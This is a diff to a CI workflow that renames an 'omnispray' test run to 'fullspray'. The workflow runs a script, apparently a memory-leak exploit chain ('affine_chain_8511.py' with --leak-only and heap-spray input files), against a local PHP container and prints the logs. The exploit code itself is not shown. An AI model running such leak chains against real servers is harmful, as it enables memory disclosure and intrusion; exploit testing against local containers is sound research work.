@@ -31,12 +31,12 @@ jobs:
           python affine_chain_8511.py --target http://127.0.0.1:18087 --endpoint /index.php --warmup warmup.bin --a1 a1-physical-pages-2.bin --b1 b1-all-windows-20000-files160.bin --query-order 1234 --leak-length 0x20000 --leak-only --pipeline-pairs > /tmp/baseline.log 2>&1
           baseline_status=$?
           docker rm -f cf-php-baseline
-          docker run -d --name cf-php-omnispray -p 18087:80 cf-php-local
+          docker run -d --name cf-php-fullspray -p 18087:80 cf-php-local
           until curl -fsS http://127.0.0.1:18087/index.php >/dev/null; do sleep 0.2; done
-          python affine_chain_8511.py --target http://127.0.0.1:18087 --endpoint /index.php --warmup warmup.bin --a1 a1-physical-pages-2.bin --b1 b1-omnispray-18000-files160.bin --query-order 1234 --leak-length 0x18000 --leak-only --pipeline-pairs > /tmp/omnispray.log 2>&1
-          omnispray_status=$?
-          docker rm -f cf-php-omnispray
+          python affine_chain_8511.py --target http://127.0.0.1:18087 --endpoint /index.php --warmup warmup.bin --a1 a1-physical-pages-2.bin --b1 b1-fullspray-18000-files160.bin --query-order 1234 --leak-length 0x18000 --leak-only --pipeline-pairs > /tmp/fullspray.log 2>&1
+          fullspray_status=$?
+          docker rm -f cf-php-fullspray
           echo "BASELINE_STATUS=$baseline_status"
           cat /tmp/baseline.log
-          echo "OMNISPRAY_STATUS=$omnispray_status"
-          cat /tmp/omnispray.log
+          echo "FULLSPRAY_STATUS=$fullspray_status"
+          cat /tmp/fullspray.log
